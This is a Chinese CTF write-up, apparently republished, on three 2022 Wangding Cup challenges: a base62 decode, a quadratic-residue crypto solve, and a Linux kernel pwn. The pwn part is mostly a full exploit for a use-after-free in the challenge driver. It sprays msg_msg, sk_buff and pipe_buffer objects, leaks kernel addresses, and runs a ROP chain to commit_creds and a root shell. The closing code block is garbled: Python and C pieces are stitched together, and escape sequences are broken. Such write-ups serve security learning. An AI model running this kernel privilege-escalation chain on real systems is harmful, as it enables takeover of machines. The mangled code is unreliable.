# 2022第三届网鼎杯 | 玄武组部分WriteUp

> 原文: https://www.ctfiot.com/56442.html
> ID: 56442

misc999  

表 9876543210qwertyuiopasdfghjklzxcvbnmMNBVCXZLKJHGFDSAPOIUYTREWQ 密文 7dFRjPItGFkeXAALp6GMKE9Y4R4BuNtIUK1RECFlU4f3PomCzGnfemFvO

题目如上，一看就是base62换表。

随便找了个网上的脚本。

suminb/base62: Python module for base62 encoding; a URL-safe encoding for arbitrary data (github.com)

之后改一下里边的表。

CHARSET_DEFAULT = "9876543210qwertyuiopasdfghjklzxcvbnmMNBVCXZLKJHGFDSAPOIUYTREWQ"
CHARSET_INVERTED = "9876543210qwertyuiopasdfghjklzxcvbnmMNBVCXZLKJHGFDSAPOIUYTREWQ"

之后导入使用就行。

import base62
import string

str1 = "7dFRjPItGFkeXAALp6GMKE9Y4R4BuNtIUK1RECFlU4f3PomCzGnfemFvO"

print (base62.decodebytes(str1))

flag{cf492422-13cb-4123-8bc5-5495f0349494}

x有50%为二次剩余，r有50%为二次剩余。如果x是二次剩余，x^r是二次剩余。。如果x是二次非剩余，x^r有50%为二次非剩余。flag{有39个比特，所以如果x为二次非剩余，x为二次非剩余，x^r均为二次剩余的概率微乎其微。所以我们可以以flag的开头来确定哪几组数据是二次剩余。最后获取到13组数据。

随后用那几组数据再次判断每个enc的二次剩余性质。因为此时。flag为1是x^r，肯定为二次剩余。flag为0是r，50%是二次剩余。所以，flag初始设为全1，每组数据用来更新flag。13组数据，最终判断错误的概率是1/(2^13)。微乎其微。

pwn557  
题目分析

这里是个分配函数，操作码为0x20，就会分配出一个1024大小的空间。

这里是个释放函数，操作码为0x30，就会将刚才分配出的空间释放掉，但是没有置零，所以这里存在一个uaf漏洞。

这里释放的空间限制了大小是1024，就要找大小为1024的结构体，这里跟D3CTF2022的d3kheap题目有点像，于是直接网上找那个exp过来魔改一下。

先是分配一个 1024 大小的 object，然后释放该 object，将其分配到别的结构体（victim）上，最后释放该 object，此时 victim 虽然还处在使用阶段，但是在 slub 中其同时也被视为一个 free object，我们此时便完成了 UAF 的构造，由于 slub 遵循 LIFO，因此接下来分配的第一个大小为 1024 的 object 便会是 victim。

第一步 堆喷 msg_msg ，建立主从消息队列，我们现在有了一个UAF的机会，这里我们选择使用 msg_msg 这一结构体。

第二步 构造 UAF，堆喷 sk_buff 定位 victim 队列。

第三步 堆喷 sk_buff 伪造辅助消息，泄露 UAF obj 地址。

第四步 堆喷 pipe_buffer，泄露内核基址。

第五步  伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权。


```
CHARSET_DEFAULT = "9876543210qwertyuiopasdfghjklzxcvbnmMNBVCXZLKJHGFDSAPOIUYTREWQ"
CHARSET_INVERTED = "9876543210qwertyuiopasdfghjklzxcvbnmMNBVCXZLKJHGFDSAPOIUYTREWQ"
import base62
import string

str1 = "7dFRjPItGFkeXAALp6GMKE9Y4R4BuNtIUK1RECFlU4f3PomCzGnfemFvO"

print (base62.decodebytes(str1))
from Crypto.Util.number import *
import random
'''
from secret import flag

f = open("output.txt","w")

for i in range(18):
    p = getPrime(256)
    x = random.randint(2, p-1)
    tmp = bytes_to_long(flag)
    enc = []
    for j in range(size(tmp)):
        r = random.randint(2, p-1)
        if tmp%2:
            enc += [pow(x, r, p)]
        else:
            enc += [r]
        tmp //= 2
    
    f.write("p = " + str(p) + "n")
    f.write("enc = " + str(enc) + "n")
'''

with open('output.txt') as f:
    data = f.read().split("n")

p=[]
enc=[]
for each in data:
    if "p =" in each:
        p += [int(each[4:])]

for each in data:
    if "enc =" in each:
        enc += [eval(each[6:])]

    #print(enc[0])
a="110011001101100011000010110011101111011"

puseful = []
encusefule = []
for i in range(len(p)):
    pp = p[i]
    flagg = 1
    encs = enc[i][::-1]
    for j in range(len(a)):
        if a[j] == "1":
            #print(encs[j])
            if pow(encs[j],(pp-1)//2,pp) != 1:
                #print("0")
                flagg=0
                break
    if flagg:
        puseful+=[pp]
        encusefule += [encs]

print(len(puseful))

flag = [1]*335
for i in range(len(puseful)):
    pp = puseful[i]
    encs = encusefule[i][::-1]
    for j in range(len(encs)):
        if pow(encs[j],(pp-1)//2,pp) != 1:
            flag[j] = 0
    print(bytes.fromhex((hex(int((''.join(str(f) for f in flag))[::-1],2))[2:])))
typedef struct {
    unsigned long long num;
    void *ptr;
}args;

void add(){
    args arg ;
    arg.num = 1024;
    arg.ptr = "deadbeef";
    ioctl(fd,0x20,&arg);    //add
}

void del(){
    args arg ;
    arg.num = 0;
    ioctl(fd,0x30,&arg);    //del
}
    #define _GNU_SOURCE
    #include <err.h>
    #include <errno.h>
    #include <fcntl.h>
    #include 
    #include <sched.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include 
    #include <net/if.h>
    #include <netinet/in.h>
    #include <sys/ipc.h>
    #include <sys/msg.h>
    #include <sys/socket.h>
    #include <sys/syscall.h>
    #define MSG_COPY        040000
    #define PAGE_SIZE 0x1000
    #define PRIMARY_SIZE 0x1000
    #define SECONDARY_SIZE 0x400

    #define NUM_SOCKETS 4
    #define NUM_SKBUFFS 128
    #define NUM_PIPEFDS 256
    #define NUM_MSQIDS 4096

    #define HOLE_STEP 1024

    #define MTYPE_PRIMARY 0x41
    #define MTYPE_SECONDARY 0x42
    #define MTYPE_FAKE 3

size_t user_cs, user_ss, user_rflags, user_sp;
unsigned long long int base = 0xffffffff8203ed80;
unsigned long long int addr_base;
unsigned long long int canary;

    #define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff810c99d0;
void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff810c9540;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov %cs, user_csn"
            "mov %ss, user_ssn"
            "mov %rsp, user_spn"
            "pushfn"
            "pop user_rflagsn"
            );
    puts("[*]status has been saved.");
    printf("cs:%ptss:%pnrsp:%ptrflags:%pn",user_cs,user_ss,user_sp,user_rflags);
}

void get(){

    commit_creds(prepare_kernel_cred(0));
 asm(
  "swapgsn"
  "pushq user_ssn"
  "pushq user_spn"
  "pushq user_rflagsn"
  "pushq user_csn"
  "push $shelln"
  "iretqn");
}

void shell(){
    system("/bin/sh");
}

uint64_t u64(char * s){
    uint64_t result = 0;
    for (int i = 7 ; i >=0 ;i--){
        result = (result << 8) | (0x00000000000000ff&s[i]);
    }
    return result;
}

unsigned long long int calc(unsigned long long int addr){
    printf("%p->%pn",addr,addr_base-base+addr);
    return addr_base-base+addr;
}
int fd;

typedef struct msg{
  long mtype;
  char mtext[0x400-0x50];
}msg;

struct pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

struct msg_msgseg {
  uint64_t next;
};

struct msg_msg {
 void *m_list_next;
    void *m_list_prev;
 long m_type;
 size_t m_ts;  /* message text size */
 void *next;
 void *security;
};

    #define MSG_MSG_SIZE (sizeof(struct msg_msg))
    #define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))
struct {
  long mtype;
  char mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];
} msg_fake;

int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) {
  *(long *)msgp = msgtyp;
  if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) < 0) {
    perror("[-] msgsnd");
    return -1;
  }
  return 0;
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) < 0) {
    perror("[-] msgrcv");
    return -1;
  }
  return 0;
}

int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT) <
      0) {
    perror("[-] msgrcv");
    return -1;
  }
  return 0;
}

int msqid[10];

int32_t make_queue(key_t key, int msgflg) 
{
    int32_t result;
    if ((result = msgget(key, msgflg)) == -1) 
    {
        perror("msgget failure");
        exit(-1);
    }
    return result;
}

void spray_1k(int n,int queue[])
{
    char buffer[0x400] = {0}, recieved[0x400] = {0};
    msg *message = (msg *)buffer;
    int size = 0x400;

    memset(buffer, 0x41, sizeof(buffer));
    for (int i = 0; i < n; i++)
    {
        write_msg(queue[i+0x10], message, size - 0x30, 1);
    }
}

void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_ts, uint64_t next) {
  msg->m_list_next = m_list_next;
  msg->m_list_prev = m_list_prev;
  msg->m_type = 3;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = 0;
}

    #define NUM_SOCKETS 10
    #define NUM_SKBUFFS 128
int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (write(ss[i][0], buf, size) < 0) {
        perror("[-] write");
        return -1;
      }
    }
  }
  return 0;
}

int free_skbuff(int ss[NUM_SOCKETS][2], void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (read(ss[i][1], buf, size) < 0) {
        perror("[-] read");
        return -1;
      }
    }
  }
  return 0;
}

size_t buf[0x4000/8];

void build_rop(size_t *rop){
    int idx = 0;
    char tmp[0x100];
    rop[idx++] = calc(0xffffffff819353b1);//ret
    rop[idx++] = calc(0xFFFFFFFF8178E6DD);//pop rdi;
    rop[idx++] = 0;
    rop[idx++] = calc(prepare_kernel_cred);
    rop[idx++] = calc(0xffffffff819353b1);//ret
    rop[idx++] = calc(0xffffffff819353b1);//ret
    rop[idx++] = calc(0xffffffff8180aae2);//pop rbx; pop rbp; ret;
    rop[idx++] = 0;
    rop[idx++] = 0;
    rop[idx++] = calc(0xffffffff81bc949b);//mov rdi, rax;rep;ret;
    rop[idx++] = calc(commit_creds);
    rop[idx++] = calc(0xffffffff819353b1);//ret
    rop[idx++] = calc(0xffffffff819353b1);//ret
    rop[idx++] = calc(0xffffffff819353b1);//ret
    rop[idx++] = calc(0xffffffff819353b1);//ret
    rop[idx++] = calc(0xffffffff819353b1);//ret
    rop[idx++] = calc(0xffffffff819353b1);//ret
    rop[idx++] = calc(0xffffffff819353b1);//ret
    rop[idx++] = calc(0xFFFFFFFF81C00FCB);//swapgs_restore
    rop[idx++] = 0;
    rop[idx++] = 0;
    rop[idx++] = shell;
    rop[idx++] = 0x33;
    rop[idx++] = 0x246;
    rop[idx++] = &tmp;
    rop[idx++] = 0x2b;

}

typedef struct {
    unsigned long long num;
    void *ptr;
}args;

void add(){
    args arg ;
    arg.num = 1024;
    arg.ptr = "deadbeef";
    ioctl(fd,0x20,&arg);    //add
}

void del(){
    args arg ;
    arg.num = 0;
    ioctl(fd,0x30,&arg);    //del
}

void debug(){
    args arg ;
    arg.num = 0;
    getchar();
    ioctl(fd,0x30,0);    //debug
}

int main(){
 save_status();
    for(int i = 0;i < 4096;i++){
        msqid[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    }
    int ss[NUM_SOCKETS][2];
    int ss2[NUM_SOCKETS][2];
    int pipefd[NUM_PIPEFDS][2];
    for(int i = 0;i < NUM_SOCKETS;i++){
        socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]);
        socketpair(AF_UNIX, SOCK_STREAM, 0, ss2[i]);
    }
    fd = open("/dev/kernelpwn",2);
    spray_1k(10,msqid);
    msg message;
    memset(&message,0,sizeof(message));
    message.mtype = 1;
    *(int *)&message.mtext[0] = 0xdeadbeef;
    *(int *)&message.mtext[4] = 1;
    write_msg(msqid[0],&message,sizeof(message),1);
    *(int *)&message.mtext[4] = 2;
    write_msg(msqid[1],&message,sizeof(message),1);
    add();
    del();
    *(int *)&message.mtext[4] = 0xaaaaaaaa;
    write_msg(msqid[0],&message,sizeof(message),2);
    del();
    *(int *)&message.mtext[4] = 0xbbbbbbbb;
    write_msg(msqid[1],&message,sizeof(message),2);
    *(int *)&message.mtext[0] = 0xdddddddd;
    for(int i = 0;i < 10;i++){
        *(int *)&message.mtext[4] = i;
        write_msg(msqid[2],&message,sizeof(message),2);
    }
    puts("Now msqid[0] and msqid[1] -> one info");
    printf("[*] Freeing real secondary message...n");
    read_msg(msqid[1],&message,sizeof(message),2);
    char sec[0x400-0x140];
    printf("[*] Spraying fake secondary messages...n");
    memset(&sec, 0, sizeof(sec));
    build_msg_msg(sec,0x41414141,0x42424242,PAGE_SIZE - MSG_MSG_SIZE,0);
    spray_skbuff(ss,sec,sizeof(sec));
    // debug();
    peek_msg(msqid[0],&msg_fake,sizeof(msg_fake),1);
    size_t kheapbasepre = 0;
    size_t kheapbasenext = 0;

    int preidx = 0;
    int nextidx = 0;
    for(int i = 0;i < sizeof(msg_fake.mtext)/8;i++){
        uint32_t high = *(uint32_t *)&msg_fake.mtext[i*8+4];
        uint32_t low = *(uint32_t *)&msg_fake.mtext[i*8];
        // printf("%p:%pt%pt%pn",i*8,*(size_t *)&msg_fake.mtext[i*8],high,low);
        if(low == 0xdddddddd){
            printf("%pt%pn",*(size_t *)&msg_fake.mtext[(i-5)*8],*(size_t *)&msg_fake.mtext[(i-6)*8]);
            if(high >= 1 && high <= 8){
                kheapbasepre = *(size_t *)&msg_fake.mtext[(i-5)*8];
                kheapbasenext = *(size_t *)&msg_fake.mtext[(i-6)*8];
                preidx = high-1;
                nextidx = high+1;
                break;
            }
        }
    }
    printf("kheapbasepre:%pnkheapbasenext:%pnidx:%dn",kheapbasepre,kheapbasenext,preidx);
    // free_skbuff(ss,sec,sizeof(sec));
    del();
    printf("[*] Spraying pipe_buffer objects...n");
    for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (pipe(pipefd[i]) < 0) {
            perror("[-] pipe");
            exit(-1);
        }
        // Write something to populate pipe_buffer.
        if (write(pipefd[i][1], "pwn", 3) < 0) {
            perror("[-] write");
            exit(-1);
        }
    }

    size_t pipe_buffer_ops=0;
    printf("[*] Leaking and freeing pipe_buffer object...n");
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
            if (read(ss[i][1], sec, sizeof(sec)) < 0) {
                perror("[-] read");
                exit(-1);
            }
            if (((*(uint64_t *)&sec[0x10]) & 0xFFFF000000000000) == 0xFFFF000000000000){
                pipe_buffer_ops = *(uint64_t *)&sec[0x10];
            }
        }
    }    
    addr_base = pipe_buffer_ops;
    printf("pipe_buffer_ops:%pn",pipe_buffer_ops);

    printf("[+] STAGE 4: Kernel code executionn");
    memset(sec,0,sizeof(sec));
    build_rop(sec);
    *(size_t *)(sec+0x39) = calc(0xffffffff819353b0); //pop rsp;ret
    struct pipe_buffer *buf = &sec;
    buf->ops = kheapbasepre;
    spray_skbuff(ss,sec,sizeof(sec));
    memset(sec,0xc,sizeof(sec));
    struct pipe_buf_operations *fops = &sec;
    fops->release = calc(0xffffffff8172536c); //push rsi; jmp qword ptr [rsi + 0x39];
    for(int i = 0;i < 10;i++){
        read_msg(msqid[2],&message,sizeof(message),2);
    }
    spray_skbuff(ss2,sec,sizeof(sec));
    // debug();
    printf("[*] Releasing pipe_buffer objects...n");
    for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (close(pipefd[i][0]) < 0) {
            perror("[-] close");
            exit(-1);
        }
        if (close(pipefd[i][1]) < 0) {
            perror("[-] close");
            exit(-1);
        }
    }
    system("/bin/sh");
    return 0;
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/10-1663216811.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/0-1663216812.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/8-1663216812.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/4-1663216813.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/2-1663216813.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/8-1663216814.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/8-1663216814.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/4-1663216815.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/2-1663216815.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/6-1663216816.jpeg)